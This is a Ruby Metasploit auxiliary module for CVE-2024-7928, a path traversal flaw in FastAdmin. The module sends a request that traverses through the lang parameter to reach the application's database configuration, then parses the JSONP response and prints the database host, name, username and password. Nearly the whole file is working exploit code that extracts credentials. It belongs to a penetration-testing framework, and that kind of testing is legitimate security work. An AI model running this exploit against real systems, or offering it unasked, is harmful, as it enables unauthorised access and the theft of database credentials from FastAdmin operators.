# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# Metasploit auxiliary module to exploit path traversal vulnerability (CVE-2024-7928) in FastAdmin and extract database credentials.
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FastAdmin Path Traversal',
        'Description' => 'Exploits path traversal vulnerability in FastAdmin (CVE-2024-7928) affecting versions up to 1.3.3.20220121, allowing unauthorized access to sensitive files via the lang parameter.',
        'References' => [
          %w[CVE 2024-7928],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2024-7928'],
          ['URL', 'https://s4e.io/tools/fastadmin-path-traversal-cve-2024-7928']
        ],
        'Author' => [
          'Rabbit 的个人中心', # Vulnerability discovery
          'bigb0x',             # Python script
          'Kazgangap'           # Metasploit module
        ],
        'DisclosureDate' => '2024-08-19',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to FastAdmin instance', '/'])
      ]
    )
  end

  def run_host(host)
    url = normalize_uri(datastore['TARGETURI'], 'index/ajax/lang?lang=../../application/database')

    res = send_request_cgi('uri' => url, 'method' => 'GET')
    unless res&.code == 200 && res.body.include?('jsonpReturn(')
      print_error("#{host} is not vulnerable or did not respond as expected.")
      return
    end

    jsonp_match = res.body.match(/jsonpReturn\((.*)\);/)
    return print_error("#{host} - Failed to find JSONP structure.") unless jsonp_match

    parse_jsonp_response(host, jsonp_match[1].strip)
  rescue StandardError => e
    print_error("#{host} - Error occurred: #{e.message}")
  end

  def parse_jsonp_response(host, jsonp_data)
    data = parse_json(jsonp_data)
    return unless data

    unless data.dig('username') && data.dig('password') && data.dig('database')
      print_error("#{host} - Required fields missing in response.")
      return
    end

    print_good("#{host} is vulnerable!")
    print_good("DB Type   : #{data['type']}")
    print_good("Hostname  : #{data['hostname']}")
    print_good("Database  : #{data['database']}")
    print_good("Username  : #{data['username']}")
    print_good("Password  : #{data['password']}")

    report_note(
      host: host,
      port: rport,
      type: 'fastadmin.db.info',
      data: data,
      update: :unique_data
    )
  end

  def parse_json(jsonp_data)
    JSON.parse(jsonp_data)
  rescue JSON::ParserError => e
    print_error("Failed to parse JSONP response: #{e.message}")
    nil
  end
end
